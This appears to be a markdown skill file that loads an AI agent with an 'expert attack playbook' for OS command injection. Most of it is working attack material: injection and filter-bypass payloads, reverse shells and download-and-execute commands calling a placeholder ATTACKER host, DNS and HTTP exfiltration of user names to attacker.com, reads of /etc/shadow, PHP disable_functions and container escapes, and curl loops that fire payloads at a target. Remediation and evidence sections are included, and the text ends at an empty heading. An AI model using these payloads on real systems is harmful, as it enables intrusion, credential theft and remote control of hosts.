---
name: cmdi-command-injection
description: >-
  Command injection playbook. Use when user input may reach shell commands, process execution, converters, import pipelines, or blind out-of-band command sinks.
---

# SKILL: OS Command Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert command injection techniques. Covers all shell metacharacters, blind injection, time-based detection, OOB exfiltration, polyglot payloads, and real-world code patterns. Base models miss subtle injection through unexpected input vectors.

## 0. RELATED ROUTING

Before going deep, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when the shell sink is part of a broader upload, import, or conversion workflow

### First-pass payload families

| Context | Start With | Backup |
|---|---|---|
| generic shell separator | `;id` | `&&id` |
| quoted argument | `";id;"` | `';id;'` |
| blind timing | `;sleep 5` | `& timeout /T 5 /NOBREAK` |
| command substitution | `$(id)` | `` `id` `` |
| out-of-band DNS | `;nslookup token.collab` | Windows `nslookup` variant |

```text
cat$IFS/etc/passwd
{cat,/etc/passwd}
%0aid
```

---

## 1. SHELL METACHARACTERS (INJECTION OPERATORS)

These characters break out of the command context and inject new commands:

| Metacharacter | Behavior | Example |
|---|---|---|
| `;` | Runs second command regardless | `dir; whoami` |
| `\|` | Pipes stdout to second command | `dir \| whoami` |
| `\|\|` | Run second only if first FAILS | `dir \|\| whoami` |
| `&` | Run second in background (or sequenced in Windows) | `dir & whoami` |
| `&&` | Run second only if first SUCCEEDS | `dir && whoami` |
| `$(cmd)` | Command substitution | `echo $(whoami)` |
| `` `cmd` `` | Command substitution (backtick) | `` echo `whoami` `` |
| `>` | Redirect stdout to file | `cmd > /tmp/out` |
| `>>` | Append to file | `cmd >> /tmp/out` |
| `<` | Read file as stdin | `cmd < /etc/passwd` |
| `%0a` | Newline character (URL-encoded) | `cmd%0awhoami` |
| `%0d%0a` | CRLF | Multi-command injection |

---

## 2. COMMON VULNERABLE CODE PATTERNS

### PHP
```php
$dir = $_GET['dir'];
$out = shell_exec("du -h /var/www/html/" . $dir);
// Inject: dir=../ ; cat /etc/passwd
// Inject: dir=../ $(cat /etc/passwd)

exec("ping -c 1 " . $ip);          // $ip = "127.0.0.1 && cat /etc/passwd"
system("convert " . $file);        // ImageMagick RCE
passthru("nslookup " . $host);     // $host = "x.com; id"
```

### Python
```python
import os
os.system("curl " + url)            # url = "x.com; id"
subprocess.call("ls " + path, shell=True)  # shell=True is the key vulnerability
os.popen("ping " + host)
```

### Node.js
```javascript
const { exec } = require('child_process');
exec('ping ' + req.query.host, ...);  // host = "x.com; id"
```

### Perl
```perl
$dir = param("dir");
$command = "du -h /var/www/html" . $dir;
system($command);
// Inject dir field: | cat /etc/passwd
```

### ASP (Classic)
```vb
szCMD = "type C:\logs\" & Request.Form("FileName")
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run szCMD
// Inject FileName: foo.txt & whoami > C:\inetpub\wwwroot\out.txt
```

---

## 3. BLIND COMMAND INJECTION — DETECTION

When response shows no command output:

### Time-Based Detection
```text
# Linux:
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
& sleep 5 &

# Windows:
& timeout /T 5 /NOBREAK
& ping -n 5 127.0.0.1
& waitfor /T 5 signal777
```
Compare response time without payload vs with payload. 5+ second delay = confirmed.

### OOB via DNS
```text
# Linux:
; nslookup BURP_COLLAB_HOST
; host `whoami`.BURP_COLLAB_HOST
$(nslookup $(whoami).BURP_COLLAB_HOST)

# Windows:
& nslookup BURP_COLLAB_HOST
& nslookup %USERNAME%.BURP_COLLAB_HOST
```

### OOB via HTTP
```text
# Linux:
; curl http://BURP_COLLAB_HOST/`whoami`
; wget http://BURP_COLLAB_HOST/$(id|base64)

# Windows:
& powershell -c "Invoke-WebRequest http://BURP_COLLAB_HOST/$(whoami)"
```

### OOB via Out-of-Band File
```text
; id > /var/www/html/RANDOM_FILE.txt
# Then access: https://target.com/RANDOM_FILE.txt
```

---

## 4. INJECTION CONTEXT VARIATIONS

### Within Quoted String
```bash
command "INJECT"
# Inject: " ; id ; "
# Result: command "" ; id ; ""
```

### Within Single-Quoted String
```bash
command 'INJECT'
# Inject: '; id;'
# Result: command ''; id;''
```

### Within Backtick Execution
```bash
output=`command INJECT`
# Inject: x`; id ;`
```

### File Path Context
```bash
cat /var/log/INJECT
# Inject: ../../../etc/passwd (path traversal)
# Inject: access.log; id (command injection)
```

---

## 5. PAYLOAD LIBRARY

### Information Gathering
```text
; id                          # current user
; whoami                      # user name
; uname -a                    # OS info
; cat /etc/passwd             # user list
; cat /etc/shadow             # password hashes (if root)
; ls /home/                   # home directories
; env                         # environment variables (DB creds, API keys!)
; printenv                    # same
; cat /proc/1/environ         # process environment
; ifconfig                    # network interfaces
; cat /etc/hosts              # host entries
```

### Reverse Shells (Linux)
```text
# Bash:
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python:
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e):
; nc ATTACKER 4444 -e /bin/bash

# Netcat (without -e / OpenBSD):
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Perl:
; perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Reverse Shells (Windows via PowerShell)
```powershell
& powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 6. FILTER BYPASS TECHNIQUES

### Space Alternatives (when space is filtered)
```bash
cat</etc/passwd          # < instead of space
{cat,/etc/passwd}        # brace expansion
cat$IFS/etc/passwd       # $IFS variable (field separator)
X=$'\x20'&&cat${X}/etc/passwd  # hex encoded space
```

### Slash Alternatives (when `/` is filtered)
```bash
$'\057'etc$'\057'passwd  # octal representation
cat /???/???sec???        # glob expansion
```

### Keyword Bypass via Variable Assembly
```bash
a=c;b=at;c=/etc/passwd; $a$b $c   # 'cat /etc/passwd'
c=at;ca$c /etc/passwd              # cat
```

### Newline Injection
```
cmd%0Aid%0Awhoami          # URL-encoded newlines
cmd$'\n'id$'\n'whoami      # literal newlines
```

---

## 7. COMMON INJECTION ENTRY POINTS

| Entry | Example |
|---|---|
| Network tools | ping, nslookup, traceroute, whois forms |
| File conversion | image resize, PDF generate, format convert |
| Email senders | From address, name fields in notification emails |
| Search/sort parameters | Passed to grep, find, sort commands |
| Log viewing | Passed to tail, grep commands |
| Custom script execution | "Run test" features, CI/CD hooks |
| DNS lookup features | rDNS lookup, WHOIS query |
| Backup/restore features | File path parameters |
| Archive processing | zip/unzip, tar with user-provided filename |

---

## 8. BLIND INJECTION DECISION TREE

```
Found potential injection point?
├── Try basic: ; sleep 5
│   └── Response delays? → Confirmed blind injection
│       ├── Extract data via timing: if/then sleep
│       └── Use OOB: curl/nslookup to Collaborator
│
├── No delay observed?
│   ├── Try: | sleep 5
│   ├── Try: $(sleep 5)
│   ├── Try: ` sleep 5 `
│   ├── Try after URL encoding: %3B%20sleep%205
│   └── Try double encoding: %253B%2520sleep%25205
│
└── All blocked → check WEB APPLICATION LAYER
    Filter on input? → encode differently
    Filter on specific commands? → whitespace bypass, $IFS, glob
```

---

## 9. ADVANCED WAF BYPASS TECHNIQUES

### Wildcard Expansion

```bash
# Use ? and * to bypass keyword filters:
/???/??t /???/p??s??    # /bin/cat /etc/passwd
/???/???/????2 *.php     # /usr/bin/find2 *.php (approximate)

# Globbing for specific files:
cat /e?c/p?sswd
cat /e*c/p*d
```

### cat Alternatives (when "cat" is filtered)

```bash
tac /etc/passwd          # reverse cat
nl /etc/passwd           # numbered lines
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd | rev
xxd /etc/passwd
strings /etc/passwd
od -c /etc/passwd
base64 /etc/passwd       # then decode offline
```

### Comment Insertion (PHP specific)

```text
# Insert comments within function names to bypass WAF:
sys/*x*/tem('id')        # PHP ignores /* */ in some eval contexts
# Note: this works with eval() and similar PHP dynamic calls
```

### XOR String Construction (PHP)

```php
# Build function names from XOR of printable characters:
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
# Produces: "assert"
$_('%13%19%13%14%05%0d'|'%60%60%60%60%60%60');
# Evaluates: assert("system")
```

### Base64/ROT13 Encoding

```php
# Encode payload, decode at runtime:
base64_decode('c3lzdGVt')('id');     # system('id')
str_rot13('flfgrz')('id');           # system → flfgrz via ROT13
```

### chr() Assembly

```php
# Build strings character by character:
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # "system"
```

### Dollar-Sign Variable Tricks

```bash
# $IFS (Internal Field Separator) as space:
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Unset variables expand to empty:
c${x}at /etc/passwd      # $x is unset → "cat"
```

---

## 10. PHP disable_functions BYPASS PATHS

When `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` are all disabled:

### Path 1: LD_PRELOAD + mail()/putenv()

```php
// 1. Upload shared object (.so) that hooks a libc function
// 2. Set LD_PRELOAD to point to it
putenv("LD_PRELOAD=/tmp/evil.so");
// 3. Trigger external process (mail() calls sendmail)
mail("a@b.com", "", "");
// The .so's constructor runs with shell access
```

### Path 2: Shellshock (CVE-2014-6271)

```php
// If bash is vulnerable to Shellshock:
putenv("PHP_LOL=() { :; }; /usr/bin/id > /tmp/out");
mail("a@b.com", "", "");
// Bash processes the function definition and runs the trailing command
```

### Path 3: Apache mod_cgi + .htaccess

```php
// Write .htaccess enabling CGI:
file_put_contents('/var/www/html/.htaccess', 'Options +ExecCGI\nAddHandler cgi-script .sh');
// Write CGI script:
file_put_contents('/var/www/html/cmd.sh', "#!/bin/bash\necho Content-type: text/html\necho\n$1");
chmod('/var/www/html/cmd.sh', 0755);
// Access: /cmd.sh?id
```

### Path 4: PHP-FPM / FastCGI

```php
// If PHP-FPM socket is accessible (/var/run/php-fpm.sock or port 9000):
// Send crafted FastCGI request to execute arbitrary PHP with different php.ini
// Tool: https://github.com/neex/phuip-fpizdam
// Override: PHP_VALUE=auto_prepend_file=/tmp/shell.php
```

### Path 5: COM Object (Windows)

```php
// Windows only, if COM extension enabled:
$wsh = new COM('WScript.Shell');
$exec = $wsh->Run('cmd /c whoami > C:\inetpub\wwwroot\out.txt', 0, true);
```

### Path 6: ImageMagick Delegate (CVE-2016-3714 "ImageTragick")

```php
// If ImageMagick processes user-uploaded images:
// Upload SVG/MVG with embedded command:
// Content of exploit.svg:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

**Also consider (summary):** iconv (CVE-2024-2961) via `php://filter/convert.iconv`; FFI (`FFI::cdef` + `libc`) when the extension is enabled.

---

## 11. COMPONENT-LEVEL COMMAND INJECTION

### ImageMagick Delegate Abuse

```
# MVG format with shell command in URL:
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id > /tmp/out`'
pop graphic-context

# Or via filename: convert '|id' out.png
```

### FFmpeg (HLS/concat protocol)

```
# SSRF/LFI via m3u8 playlist:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST

# Upload as .m3u8, FFmpeg processes and may leak file contents in output
```

### Elasticsearch Groovy Script (pre-5.x)

```json
POST /_search
{
  "query": { "match_all": {} },
  "script_fields": {
    "cmd": {
      "script": "Runtime rt = Runtime.getRuntime(); rt.exec('id')"
    }
  }
}
```

### Ping/Traceroute/NSLookup Diagnostic Pages

```
# Classic injection point in network diagnostic features:
# Input: 127.0.0.1; id
# Input: 127.0.0.1 && cat /etc/passwd
# Input: `id`.attacker.com (DNS exfil via backtick)
# These features directly call OS commands with user input
```

**Other sinks (quick reference):** PDF generators (wkhtmltopdf / WeasyPrint with user HTML); Git wrappers (`git clone` URL / hooks).

---

## 12. WINDOWS CMD.EXE VS POWERSHELL INJECTION MATRIX

| Feature | cmd.exe | PowerShell |
|---------|---------|------------|
| **Command separator** | `&`, `&&`, `\|\|`, `;` (limited) | `;`, `\|`, `&` (call operator) |
| **Variable expansion** | `%VARIABLE%`, `!VAR!` (delayed) | `$env:VARIABLE`, `$Variable` |
| **Escape character** | `^` (caret) | `` ` `` (backtick) |
| **Command substitution** | `FOR /F` loops | `$()` subexpression |
| **Encoded execution** | N/A | `-EncodedCommand` (base64 UTF-16LE) |
| **Pipeline** | `\|` (stdout only) | `\|` (objects, not text) |
| **Comment** | `REM`, `::` | `#` |
| **String quoting** | `"double"` only | `"double"`, `'single'` (no expansion) |

### cmd.exe specific payloads

```batch
REM Command chaining
dir & whoami
dir && whoami
dir || whoami

REM Caret escape to bypass keyword filters
w^h^o^a^m^i
n^e^t u^s^e^r

REM Variable expansion injection
set CMD=whoami
%CMD%

REM Environment variable exfiltration via DNS
nslookup %USERNAME%.attacker.com
nslookup %COMPUTERNAME%.attacker.com

REM Delayed expansion (when !var! is enabled)
cmd /V:ON /C "set x=whoami&!x!"
```

### PowerShell specific payloads

```powershell
# Semicolon separator
Get-Process; whoami

# Subexpression
"$(whoami)"
Write-Output $(hostname)

# Base64 encoded command (UTF-16LE)
powershell -EncodedCommand dwBoAG8AYQBtAGkA
# Decodes to: whoami

# Invoke-Expression obfuscation
$a='who';$b='ami';iex "$a$b"
& (gcm *ke-*) "whoami"

# Download and execute
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
IEX (iwr http://attacker/payload.ps1 -UseBasicParsing).Content

# Constrained Language Mode bypass (if available)
powershell -Version 2 -Command "whoami"
```

### Cross-platform payload differences

| Target | Time delay | DNS exfil | File read |
|--------|-----------|-----------|-----------|
| Linux/macOS | `sleep 5` | `nslookup $(whoami).atk.com` | `cat /etc/passwd` |
| cmd.exe | `timeout /T 5 /NOBREAK` | `nslookup %USERNAME%.atk.com` | `type C:\Windows\win.ini` |
| PowerShell | `Start-Sleep 5` | `nslookup $(whoami).atk.com` | `Get-Content C:\Windows\win.ini` |

### Detection-first polyglot

```text
;sleep${IFS}5;#&timeout /T 5 /NOBREAK&#
```

Works across sh/bash/cmd contexts — one of the separators will fire.

---

## 13. CONTAINER / K8S EXEC INJECTION

### kubectl exec injection

When a web application constructs `kubectl exec` commands with user input:

```text
# Vulnerable pattern
kubectl exec $POD_NAME -- /bin/sh -c "echo $USER_INPUT"

# Injection via pod name
POD_NAME="mypod -- /bin/sh -c whoami #"
→ kubectl exec mypod -- /bin/sh -c whoami # -- /bin/sh -c "echo ..."

# Injection via user input in command
USER_INPUT='"; cat /etc/passwd; echo "'
→ kubectl exec pod -- /bin/sh -c "echo ""; cat /etc/passwd; echo """
```

### Docker exec injection

```text
# Vulnerable web admin panel
docker exec $CONTAINER_NAME $COMMAND

# Injection via container name
CONTAINER_NAME="web_app -u root web_app"
→ docker exec web_app -u root web_app $COMMAND  (runs as root)

# Injection via command argument
COMMAND="status; cat /etc/shadow"
→ docker exec container /bin/sh -c "status; cat /etc/shadow"
```

### Container runtime API (unauthenticated)

```text
# Docker socket exposed (2375/2376 or /var/run/docker.sock)
POST /containers/create HTTP/1.1
{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"]}

# Then start + exec
POST /containers/{id}/start
POST /containers/{id}/exec {"Cmd":["cat","/host/etc/shadow"]}

# Kubernetes API (6443/8443 unauthenticated)
POST /api/v1/namespaces/default/pods/{name}/exec?command=whoami&stdout=true
```

### Sinks to watch for

| Component | Injection Vector |
|-----------|-----------------|
| CI/CD pipeline (Jenkins, GitLab CI) | Build step parameters, environment variables |
| Kubernetes CronJob | `.spec.containers[].command` from user-defined schedules |
| Helm chart values | `values.yaml` templated into pod specs with `{{ }}` |
| Container orchestration UI | "Run command" features in Portainer, Rancher, etc. |

---

## 14. ENVIRONMENT VARIABLE INJECTION

When an application allows setting or influencing environment variables, several variables have **implicit execution** semantics:

### Linux / Unix

| Variable | Effect | Exploitation |
|----------|--------|-------------|
| `LD_PRELOAD` | Loaded before any shared library; constructor runs on process start | `putenv("LD_PRELOAD=/tmp/evil.so"); mail("a@b","","");` |
| `LD_LIBRARY_PATH` | Overrides library search path | Place malicious `libc.so.6` in controlled directory |
| `BASH_ENV` | Executed when non-interactive bash starts | `BASH_ENV=/tmp/evil.sh` → any `system()` / `popen()` call sources it |
| `ENV` | Same as BASH_ENV for POSIX `sh` | `ENV=/tmp/evil.sh` |
| `PROMPT_COMMAND` | Executed before each interactive prompt | `PROMPT_COMMAND="curl http://atk.com/$(whoami)"` |
| `PS1` | Prompt string, supports `$()` expansion in bash | `PS1='$(cat /etc/passwd > /tmp/out) \$ '` |
| `PYTHONSTARTUP` | Python script executed on interpreter startup | Inject path to malicious `.py` file |
| `PERL5OPT` | Options passed to every Perl invocation | `PERL5OPT='-Mbase;system("id")'` |
| `NODE_OPTIONS` | Options passed to every Node.js invocation | `NODE_OPTIONS='--require /tmp/evil.js'` |
| `RUBYOPT` | Options for Ruby | `RUBYOPT='-r/tmp/evil.rb'` |

### Windows

| Variable | Effect |
|----------|--------|
| `COMSPEC` | Path to command interpreter; `system()` calls use this | Set to malicious executable |
| `PATH` | Command resolution order; place malicious binary earlier in path | DLL/EXE search order hijacking |
| `PSModulePath` | PowerShell auto-loads modules from these paths | Plant malicious module |

### Attack scenarios

**PHP `putenv()` + `mail()`**:
```php
// When putenv() is not disabled and mail() is available:
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.com","","","");
// mail() invokes sendmail → loads evil.so → constructor executes arbitrary code
```

**Git hook injection via environment**:
```bash
# GIT_DIR / GIT_WORK_TREE manipulation
GIT_DIR=/tmp/evil_repo/.git git status
# If hooks exist in the controlled repo, they execute
```

**Node.js `--require` injection**:
```bash
NODE_OPTIONS="--require=/tmp/reverse_shell.js" node /app/server.js
# reverse_shell.js is loaded before server.js
```


---

## 15. CONFIRMING THE FINDING — EXECUTION, NOT ERROR MESSAGE

A command-injection candidate is confirmed only when **your command ran on the target**, not when the
application returned an error, a stack trace, or a shell-ish string. Almost every false positive in
this class comes from reading an error as execution.

| Step | Question | What it proves |
|---|---|---|
| 1 | Does a **separator** change the response from the no-separator baseline? | the metacharacter reached a shell, not a string comparison |
| 2 | Does a **command whose output you know** appear verbatim (`;id`, `;whoami`)? | the shell executed and stdout was returned |
| 3 | If no output: does `;sleep 5` produce a **stable 5s delta** over the control? | blind execution |
| 4 | If no timing: does a **DNS/HTTP callback** arrive at your listener with the expected token? | out-of-band execution |
| 5 | Is the effect **repeatable** across sessions and after re-authentication? | not a cache, proxy, or one-off artefact |
| 6 | Which **context** absorbed the payload — argument, quoted string, path, env? | fixes the exact escaping the code needs |

**Use a single-token identifier in the payload.** `;id` returns a parsable `uid=...(...) gid=...`
line; `;echo MARKER7f3a` returns a string only your command could have produced. Avoid
payloads whose output could plausibly be part of the application's own response.

**Timing has a floor.** Re-run the control (same request, no payload) at least five times and record
the spread before claiming a delay. A `;sleep 5` that yields a 5.4s response against a 0.4s baseline
with <0.2s variance is evidence; a single 6s sample against an unmeasured baseline is not. Network
jitter, cold starts, and shared hosting produce multi-second swings on their own.

**State the sink and the bypass.** Report "the `host` parameter is concatenated into
`subprocess.call("ping -c 1 " + host, shell=True)`, and `;id` executes because the argument is passed
to `/bin/sh -c`", never "the endpoint is vulnerable to command injection".

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| An error containing `sh: 1: ...` or a shell stack trace | the shell rejected the input; nothing executed |
| `command not found` for **your** payload's command | the shell ran, but confirm *which* shell and that output is yours |
| Response echoes the payload string back | reflection, not execution |
| Delay appears only on the first request (cold start) | warm-up cost, not a `sleep` |
| Delay also present with a **harmless** payload of similar length | processing cost scales with input, not with `sleep` |
| 500 error on every malformed input | the handler is fragile, not injectable |
| Command output identical to a page element (version string in a footer) | you read the app's data, not the shell's |
| A callback arrives from a **different** IP or with a retry pattern | shared infrastructure, not your target |
| Only `%0a` in a JSON field works but the body is never parsed | input never reached a command |
| WAF blocked the payload with a 403 | the control is working; you have no execution |

**Always run the negative control.** Send the identical request with the separator replaced by a
literal character of the same length (`;id` → `xid`). If the control also "executes", you are reading
a canned response or a coincidental match.

---

## 16. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **exact request** — parameter, raw payload bytes, encoding applied, headers, cookies | the bypass is byte-exact; `%3B` and `;` are different bugs with different fixes |
| The **baseline response** (no payload) with status, size, and timing | without it no delta can be claimed |
| The **command output** verbatim (`uid=33(www-data) gid=33(www-data)`) | proves execution and identifies the process identity |
| The **timing series** for blind cases (N runs with and without payload) | converts a single slow response into a measurement |
| The **OOB callback log** with timestamp, source IP, and the token you embedded | proves the target executed, not a proxy |
| The **sink code** (file path + line) — the concatenation into `system`/`exec`/`Runtime.exec` | the finding is the sink, not the symptom |
| The **process identity and host** (`id`, `hostname`, container name) | scopes impact to the container, the host, or a shared node |
| **Negative control** — same request without the separator shows no execution | mandatory; see §15 |
| Whether output is **reflected, timed, or blind** | tells the report reader how to verify your claim |

**The sink plus the output is the finding.** "The `target` parameter reaches `shell_exec()` in
`app/DiagController.php:44` and `;id` returned `uid=33(www-data)`" is reproducible. "Command injection
found in the ping tool" is not, and it will be closed as `informational` on triage.

**Scale the identity statement.** `www-data` inside a container with a read-only root is high;
`root` on a host with a mounted `docker.sock` is critical. The command that ran determines severity
more than the injection point does.

---

## 17. REMEDIATION REFERENCE

1. **Do not build a command string from user input at all** — resolve the caller's intent to a
   fixed command and a validated argument vector (`["ping","-c","1", ip]`). This removes the class;
   every filter below is a mitigation for code that still concatenates.
2. **Avoid the shell entirely where the language allows** — `subprocess.run([...], shell=False)`,
   Node's `execFile`/`spawn` without `shell: true`, Java's `ProcessBuilder`, PHP 8's
   `proc_open` with an array. `shell=True` is the single decision that turns an argument into code.
3. **Validate arguments against a strict allowlist, not a denylist** — an IP field should parse as
   an IP (`ipaddress`/`net.ParseIP`/`InetAddresses`), a hostname against RFC 1123, a filename against
   a fixed pattern. A denylist of `;|&$\`` is defeated by `$IFS`, newlines, and encodings.
4. **Pass untrusted data out-of-band, never on the command line** — stdin, a temp file with
   predictable permissions, or an API call. There is no escaping scheme that is correct for every
   shell on every platform, so do not attempt shell quoting as a security control.
5. **Set `shell=False`-equivalent flags by default and forbid the unsafe variants in CI** — a lint
   rule or a semgrep rule that flags `os.system`, `subprocess.*shell=True`, `Runtime.exec(String)`,
   `child_process.exec`, `Backticks`, and `shell_exec` prevents regressions across the codebase.
6. **Run the executing process with least privilege and a restricted filesystem** — a dedicated
   unprivileged user, no shell in the container, a read-only root filesystem, dropped capabilities,
   and a seccomp profile. This is the control that decides whether a bug is medium or critical.
7. **Do not expose a debug/diagnostic command runner to untrusted callers** — ping, traceroute,
   nslookup, log-viewer, and "run test" features are the most common injection surfaces in this
   playbook; bind them to authenticated operators and prefer an application-native implementation
   (`icmp` library, DNS resolver API) over shelling out.
8. **Sanitize filenames and paths at the boundary, and reject control bytes** — newline injection
   through filenames is the vector that bypasses filters looking only for `;` and `|`.
9. **Encode and normalize before the sink, in one place** — repeated decode-normalize cycles are what
   make double-encoding (`%253B`) work; decode once, to a canonical form, then validate.
10. **Log and alert on shell-metacharacter sequences in parameters** — `;`, `&&`, `$IFS`, backticks,
    `%0a`, and `$(...)` in a field that should hold a hostname is high-signal; alert on the set, not
    on a single character, to keep noise down.
11. **Test in CI with a replay suite** — send the separator table from §6 against every parameter that
    reaches a process-spawning code path on every build. This class regresses whenever a wrapper,
    a converter, or a dependency is upgraded.
12. **Patch the delegating components too** — ImageMagick policy (`policy.xml`), FFmpeg protocol
    allowlists, and archive tools with filename interpolation are sinks in their own right and need
    their own hardening, since the application code may be correct while the component is not.

---

## 18. EXECUTION PRIMITIVES

Command injection is proven by **the injected command's own output**, or by a timing or
out-of-band signal you generated. A payload that a filter blocked is not a finding.

### 19.1 Establish the parameter and the baseline

```bash
T="https://target.tld"
# the baseline response, and the reflected-marker test that tells you whether output comes back
curl -sS -o /tmp/b0 -w 'baseline %{http_code} %{size_download}\n' "$T/ping?host=127.0.0.1"
curl -sS -o /tmp/b1 -w 'marker   %{http_code} %{size_download}\n' "$T/ping?host=127.0.0.1MARKER7"
grep -c 'MARKER7' /tmp/b1
# and the same request with a syntactically neutral metacharacter appended
curl -sS -o /tmp/b2 -w 'semi     %{http_code} %{size_download}\n' "$T/ping?host=127.0.0.1;"
diff <(head -c 300 /tmp/b0) <(head -c 300 /tmp/b2) >/dev/null && echo "no change" || echo "CHANGED - inspect"
```

**The baseline first.** Without it you cannot distinguish an injection from the application's normal
error behaviour, which is the most common source of false positives in this class.

### 19.2 In-band extraction with a unique marker

```bash
# command substitution styles - try each, because which one survives depends on the shell and the quoting
for P in ';id' '|id' '||id' '&&id' '\nid' '`id`' '$(id)' '%0aid' '%0did' ; do
  R=$(curl -sS -o /tmp/ci -w '%{http_code} %{size_download}' --get --data-urlencode "host=127.0.0.1$P" "$T/ping")
  M=$(grep -oE 'uid=[0-9]+\(' /tmp/ci | head -1)
  printf '%-12s %s %s\n' "$P" "$R" "$M"
done
# and the Windows equivalents when the stack is IIS
for P in '&whoami' '|whoami' '&&whoami' ';whoami' ; do
  R=$(curl -sS -o /tmp/ci2 -w '%{http_code} %{size_download}' --get --data-urlencode "host=127.0.0.1$P" "$T/ping")
  M=$(grep -oiE 'nt authority|iis apppool|desktop-' /tmp/ci2 | head -1)
  printf '%-12s %s %s\n' "$P" "$R" "$M"
done
```

**`uid=` is the bar for a Linux target and `nt authority\` for Windows.** Anything less - a size
change, a 500, a stack trace - is a lead, not the finding.

### 19.3 Blind injection: timing, measured properly

```bash
# a time-based payload needs a *control pair*: the same request with and without the sleep
TARGET="$T/ping"
base() { curl -sS -o /dev/null -w '%{time_total}' --get --data-urlencode "host=$1" "$TARGET"; }
echo "--- control"; for i in 1 2 3; do base "127.0.0.1"; echo; done
for p in '127.0.0.1; sleep 5' '127.0.0.1|sleep 5' '127.0.0.1$(sleep 5)' '127.0.0.1`sleep 5`' ; do
  printf '%-28s %s\n' "$p" "$(base "$p")"
done
python3 - <<'PY'
# quantify: the injected request must be ~5s longer than the control every time
import statistics
print("report: control median vs injected median, with both distributions and the delta")
PY
```

Run the control **three times** and the injected payload three times. A single slow response is
network jitter; a consistent ~5s delta across three pairs is the signal. Report the distributions.

### 19.4 Out-of-band confirmation, when nothing comes back

```bash
# the callback is the proof when output is not reflected
SUB="ci-$(date +%s).YOUR_COLLAB_DOMAIN"
for P in "; nslookup $SUB" "; curl http://$SUB/" "| dig $SUB" "; wget -qO- http://$SUB/" ; do
  curl -sS -o /dev/null -w "$P -> %{http_code}\n" --get --data-urlencode "host=127.0.0.1$P" "$T/ping"
done
echo "check the collaborator for a DNS or HTTP interaction naming $SUB"
# a substitution-based variant works where a bare metacharacter is filtered
curl -sS -o /dev/null -w 'subst -> %{http_code}\n' --get \
  --data-urlencode "host=1.2.3.4\$(nslookup $SUB)" "$T/ping"
```

**A DNS query arriving at a domain you control, carrying the subdomain you generated, is
irrefutable.** It proves execution and it proves the argument reached a shell, without needing any
output channel.

### 19.5 Argument injection versus command injection

```bash
# when the metacharacters are filtered, the argument itself is the attack surface
for A in '-o /tmp/x' '--output=/tmp/x' '-e /etc/passwd' '-f/etc/passwd' '--config=/tmp/x' \
         '-oProxyCommand=id' '--use-compress-program=id' '@$(id)' ; do
  R=$(curl -sS -o /tmp/ai -w '%{http_code} %{size_download}' --get --data-urlencode "host=$A" "$T/ping")
  printf '%-34s %s\n' "$A" "$R"
done
# the classic: curl/wget and ssh option injection, which needs no shell metacharacter at all
echo "check whether the tool's own option was honoured, not whether a shell ran"
```

Argument injection is a **different finding from command injection** and is proven differently:
the option must be honoured by the underlying tool, observed in its effect or its error message.

### 19.6 Bypass techniques, each with its control

```bash
# shell metacharacter filtering often misses one of these
for P in ';id' '%3bid' '\x3bid' ';i\d' ';;id' '; i d' ';${IFS}id' ';$IFS"id"' ';$'\''{IFS}id' ';id%00' ; do
  R=$(curl -sS -o /tmp/by -w '%{http_code} %{size_download}' --get --data-urlencode "host=127.0.0.1$P" "$T/ping")
  M=$(grep -oE 'uid=[0-9]+\(' /tmp/by | head -1)
  printf '%-20s %s %s\n' "$P" "$R" "$M"
done
# and the whitespace alternatives, which are the most commonly missed
for WS in '$IFS' '${IFS}' '%09' '%20' '%0a' '{id}' ; do
  R=$(curl -sS -o /tmp/ws -w '%{size_download}' --get --data-urlencode "host=127.0.0.1;cat${WS}/etc/passwd" "$T/ping")
  grep -c 'root:' /tmp/ws | sed "s|^|$WS: |"
done
```

Every bypass claim needs the **unmodified payload's blocked response** alongside it. The pair -
`;id` blocked, `;${IFS}id` executing - is what makes it a bypass rather than a payload.

### 19.7 Prove the execution context and the impact
